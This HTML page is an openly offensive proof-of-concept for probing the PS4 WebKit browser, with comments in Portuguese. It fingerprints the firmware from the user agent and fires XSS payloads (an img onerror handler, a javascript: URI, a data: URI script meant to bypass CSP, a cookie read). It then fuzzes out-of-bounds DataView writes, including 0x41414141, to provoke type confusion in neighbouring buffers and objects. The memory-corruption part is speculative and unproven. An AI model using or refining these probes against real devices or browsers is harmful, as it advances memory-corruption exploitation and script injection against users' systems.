<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - Speculative Probes v7</title>
    <style>
        /* Estilos CSS (mantidos) */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
        #user-agent-info { background: #333; color: #0f0; padding: 5px; margin-bottom: 10px; white-space: pre-wrap; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
        .log-vuln { color: #ff4444; font-weight: bold; }
        .log-leak { color: #FF9800; font-weight: bold; } /* Usado para erros/efeitos pós-corrupção */
        .log-ptr { color: #f0f; font-weight: bold; }
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
        .log-error { color: #f44336; }
        .log-crash { color: #f0f; font-weight: bold; } /* Usado para indicar alta prob. de crash */
        .xss-box { border: 2px dotted red; padding: 5px; margin: 5px; color: yellow; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Speculative Probes v7</h1>
    <p>Foco: Tentar causar Type Confusion / Efeitos Indiretos via OOB Write em Metadados (Especulativo).</p>
    <div id="user-agent-info">Recuperando User Agent...</div>
    <div id="controls">
        </div>
    <div id="poc-output"></div>
    <div id="xss-target-div" style="margin-top:10px; border: 1px dashed #555; padding: 10px;">Área para teste de XSS DOM.</div>

    <script>
        let outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => { /* Função log igual anterior */ if(!outputDiv)return;try{const t=`[${new Date().toLocaleTimeString()}]`;const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;");if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000);outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;}outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`;outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}};
        const PAUSE_DURATION = 200; // Reduzir pausa geral
        const SHORT_PAUSE = 30;  // Reduzir pausa curta

        // --- Coleta de User Agent (igual v4) ---
        const displayUserAgent = () => { /* ... código igual ao v6 ... */ const ua=navigator.userAgent||"N/A";const d=document.getElementById('user-agent-info');if(d){d.textContent=`User Agent: ${ua}`;}log(`User Agent: ${ua}`,'info');const wm=ua.match(/AppleWebKit\/([0-9.]+)/);if(wm&&wm[1]){log(`Versão WebKit (aprox): ${wm[1]}`,'info');}const pm=ua.match(/(PlayStation 4|PLAYSTATION 4)\/([0-9.]+)/);if(pm&&pm[2]){log(`Versão Firmware PS4 (UA): ${pm[2]}`,'info');}};

        // --- Teste 1: XSS (Mantido - Sucesso Confirmado) ---
        const demonstrateXSS_Alert=()=>{log("XSS Alert...","warn");try{alert('XSS Alert!');}catch(e){log(`Alerta bloq: ${e.message}`,'good');}};const demonstrateXSS_DOM=()=>{log("XSS DOM...","warn");try{const t=document.getElementById('xss-target-div');if(t){t.innerHTML='<h2 class="log-vuln">XSS DOM!</h2><img src=x onerror=alert("XSS DOM ONERROR")>';log("DOM Manip OK.",'vuln');}else{log("Alvo DOM ñ enc.","error");}}catch(e){log(`Erro XSS DOM: ${e.message}`,'error');}};const demonstrateXSS_Cookie=()=>{log("XSS Cookie...","warn");try{const c=document.cookie;log(`Cookie: '${c}'`,c?'vuln':'info');}catch(e){log(`Erro Cookie: ${e.message}`,'warn');}};
        const runCSP_XSS = () => { log("--- T1: CSP Bypass + XSS ---",'test'); try{const pL=`log("[PD] Exec...","warn");try{alert('XSS DataURI');}catch(e){log("[PD] Bloq.","good");}`;const eP=btoa(pL);const s=document.createElement('script');s.src='data:text/javascript;base64,'+eP;s.onerror=()=>{log("ERRO data:!","error");};document.body.appendChild(s);log("Script data: add.",'info');}catch(e){log(`Erro data:: ${e.message}`,'warn');} try{const i=document.createElement('img');i.src='x';i.setAttribute('onerror',"log('onerror!','info');demonstrateXSS_DOM();");document.body.appendChild(i);log("Img onerror add.",'info');}catch(e){log(`Erro onerror: ${e.message}`,'warn');} try{const a=document.createElement('a');a.href="javascript:log('Link JS!','warn');demonstrateXSS_Cookie();";a.textContent="[Clique Teste JS URI]";a.style.cssText='display:block;margin:5px;color:orange;border:1px solid orange;padding:3px;';const h=document.getElementById('js-link-placeholder');if(h)h.replaceWith(a);else document.getElementById('controls').appendChild(a);log("Link JS URI add.",'warn');}catch(e){log(`Erro link JS: ${e.message}`,'warn');} log("--- T1 Concluído ---",'test'); };


        // --- NOVO Teste 2: Speculative Metadata Corruption v7 ---
        const runMetadataCorruption_v7 = async () => {
            log("--- T2: Speculative Metadata Corruption v7 ---", 'test');
            log("Foco: Escrever OOB em vários offsets e valores, esperando causar Type Confusion ou outros efeitos.", 'warn');
            log("EXTREMO RISCO DE CRASH!", 'crash');

            const bufferSize = 64;
            // Offsets OOB relativos ao FIM do buffer atacante a testar (passo de 4 bytes)
            const oobWriteOffsets = [];
            for(let i = -32; i <= 32; i += 4) { oobWriteOffsets.push(i); }

            // Valores a escrever (32 bits) - incluindo padrões que podem ser tags ou ponteiros inválidos
            const corruptionValues = [
                 0x00000000, 0x00000001, 0xFFFFFFFF, // Básicos
                 0x41414141, // 'AAAA'
                 0x80000000, // Limites de inteiro
                 0x00000002, 0x00000003, 0x00000004, // Small integers (tags?)
                 // Adicionar outros valores se tiver hipóteses
            ];
            // Tipos de vítima
            const victimFactories = {
                "ArrayBuffer": () => new ArrayBuffer(128),
                "Uint32Array": () => new Uint32Array(32), // Mesma memória que AB(128)
                "Object": () => ({ type: 'victim', id: Math.random(), data: [1,2,3] })
            };

            // Loop principal - Iterar por tudo pode demorar MUITO e crashar cedo
            // Considerar reduzir o número de offsets/valores/vítimas se demorar demais
            outerLoop:
            for (const victimName in victimFactories) {
                for (const writeOffset of oobWriteOffsets) {
                    for (const writeValue of corruptionValues) {
                        // Verificar se outputDiv ainda existe (parar se crash anterior limpou)
                         if (!outputDiv) { log("Output Div sumiu, parando testes.", "error"); break outerLoop; }

                        log(`Testando: OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}`, 'subtest');
                        let victimObj = null;
                        let attackerBuffer = null;
                        let attackDataView = null;
                        let effectDetected = false;
                        let initialCheck = "N/A";

                        try {
                            // Alocar logo antes do teste para reduzir interferência
                            victimObj = victimFactories[victimName]();
                            attackerBuffer = new ArrayBuffer(bufferSize);
                            attackDataView = new DataView(attackerBuffer);
                            //log(`  Atacante e Vítima (${victimName}) alocados.`, 'info');

                            // Realizar escrita OOB (4 bytes)
                            const absoluteWriteAddr = attackerBuffer.byteLength + writeOffset;
                            try {
                                attackDataView.setUint32(absoluteWriteAddr, writeValue, true); // Escrever 32 bits
                                // log(`  Escrita OOB @${writeOffset} OK.`, 'good');
                            } catch (e) {
                                // Logar falha APENAS se não for 'out of bounds', pois isso é esperado
                                if (!e.message.includes("bounds")) {
                                     log(`  Escrita OOB @${writeOffset} falhou INESPERADAMENTE: ${e.message}`, 'error');
                                }
                                continue; // Pular para próximo se escrita falhar (mesmo que esperado)
                            }
                            // NÃO pausar aqui para tentar usar a vítima o mais rápido possível

                            // Tentar USAR o objeto vítima extensivamente
                            // log(`  Usando Vítima (${victimName}) pós-OOB...`, 'info');
                            try {
                                // Check inicial rápido
                                initialCheck = `Type: ${typeof victimObj}`;
                                if (victimObj?.byteLength !== undefined) initialCheck += `, BL: ${victimObj.byteLength}`;
                                else if (victimObj?.length !== undefined) initialCheck += `, L: ${victimObj.length}`;
                                //log(`    ${initialCheck}`, 'info');

                                // === Bloco de Uso Intensivo ===
                                // Ações que podem acessar metadados internos ou causar type confusion
                                let usageResult = '';
                                if (victimObj instanceof ArrayBuffer) {
                                    usageResult += `slice:${victimObj.slice(0,0)?.byteLength},`;
                                    const u8 = new Uint8Array(victimObj); // Criar view
                                    usageResult += `view[0]:${u8[0]},`;
                                } else if (ArrayBuffer.isView(victimObj)) {
                                    usageResult += `[0]:${victimObj[0]},len:${victimObj.length},BL:${victimObj.byteLength},`;
                                    victimObj.fill(1,0,1); victimObj.slice(0,0);
                                } else if (victimObj instanceof HTMLElement) {
                                     usageResult += `tag:${victimObj.tagName},txt:${victimObj.textContent?.length},`;
                                     document.body.appendChild(victimObj); document.body.removeChild(victimObj);
                                } else if (typeof victimObj === 'object' && victimObj !== null) {
                                    usageResult += `keys:${Object.keys(victimObj)?.length},str:${victimObj.toString()?.length},`;
                                    JSON.stringify(victimObj); // Pode falhar se corrompido
                                    for(const k in victimObj) { if(victimObj.hasOwnProperty(k)) usageResult+=`${k}:${typeof victimObj[k]},`; }
                                }
                                console.log(`Victim usage check`); // Linha mínima para console
                                // ==============================

                                // Check final rápido
                                let finalCheck = `Type: ${typeof victimObj}`;
                                if (victimObj?.byteLength !== undefined) finalCheck += `, BL: ${victimObj.byteLength}`;
                                else if (victimObj?.length !== undefined) finalCheck += `, L: ${victimObj.length}`;

                                // Comparar estado
                                if (initialCheck !== finalCheck) {
                                    log(`    >> ESTADO MUDOU! Antes: ${initialCheck} / Depois: ${finalCheck}`, 'leak');
                                    effectDetected = true;
                                } else {
                                    //log(`    Uso OK. Estado final: ${finalCheck}`, 'info');
                                }

                            } catch (e) {
                                log(`    ERRO AO USAR VÍTIMA (EFEITO?): ${e.message}`, 'leak');
                                effectDetected = true;
                            }
                        } catch (e) {
                            log(`  Erro GERAL: ${e.message}`, 'error');
                        } finally { victimObj = null; attackerBuffer = null; attackDataView = null; } // GC help

                        if (effectDetected) {
                           log(`  >>> EFEITO DETECTADO (OOB W @${writeOffset} val ${writeValue.toString(16)}, Vítima: ${victimName}) <<<`, 'vuln');
                           // Considerar PARAR aqui se um efeito for encontrado para analisar?
                           // break outerLoop;
                        }
                        // Pequena pausa APÓS o teste completo de um caso
                         await new Promise(r => setTimeout(r, SHORT_PAUSE));

                    } // Fim loop valores
                } // Fim loop escrita OOB
            } // Fim loop tipos de vítima
            log("--- T2 Concluído ---", 'test');
        };


        // --- Teste 3: PP (REMOVIDO) ---

        // --- Teste 4: OOB Write Confirm (Mantido - Base) ---
        const runOOBTestU8_Confirm = async () => { /* ... código igual ao v5 ... */ log("--- T4: OOB Write (Confirmação) ---",'test'); try{const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,SHORT_PAUSE));}}catch(e){log(`Erro T4: ${e.message}`,'error');} log("--- T4 Concluído ---",'test'); };

        // --- Função Principal ---
        const runAll = async () => {
             displayUserAgent();
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
            log("Iniciando todos os testes (SPECULATIVE PROBES v7)...");
            const tests = [ // Sequência atualizada
                runCSP_XSS,                     // T1: XSS Base (OK)
                runMetadataCorruption_v7,       // T2: Speculative Metadata Corruption (NOVO)
                runOOBTestU8_Confirm,           // T3: OOB Confirm (OK - Renumerado)
            ];
             for(let i=0; i < tests.length; i++){ /* ... loop igual ao v5 ... */ if(!outputDiv){console.error("Output NULO");break;} try{ log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`,'test'); const fn=tests[i];const res=fn(); if(res instanceof Promise){await res;} }catch(e){log(`ERRO TESTE ${i+1}: ${e.message} ${e.stack}`,'error');} if(i<tests.length-1&&outputDiv){log(`Pausa ${PAUSE_DURATION}ms...`,'info');await new Promise(r=>setTimeout(r,PAUSE_DURATION));} }
            if(outputDiv) log("\n\nTodos os testes SPECULATIVE PROBES v7 concluídos.", 'test');
            else console.error("Script concluído, div log NULO.");
             if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
        };

        // Adicionar controles manuais atualizados
        document.getElementById('controls').innerHTML = `
            <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
            <button onclick="runMetadataCorruption_v7()">Rodar T2 (Meta Corruption v7)</button>
            <button onclick="runOOBTestU8_Confirm()">Rodar T3 (OOB Confirm)</button>
            <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
            <br>
            <span style="margin-left: 5px;">Teste JS Link (T1): </span>
            <a id="js-link-placeholder" href="#" style="color:orange">[Link JS URI]</a>
        `;

        displayUserAgent();
        // Opcional: Rodar tudo automaticamente
        // document.addEventListener('DOMContentLoaded', runAll);
    </script>

</body>
</html>
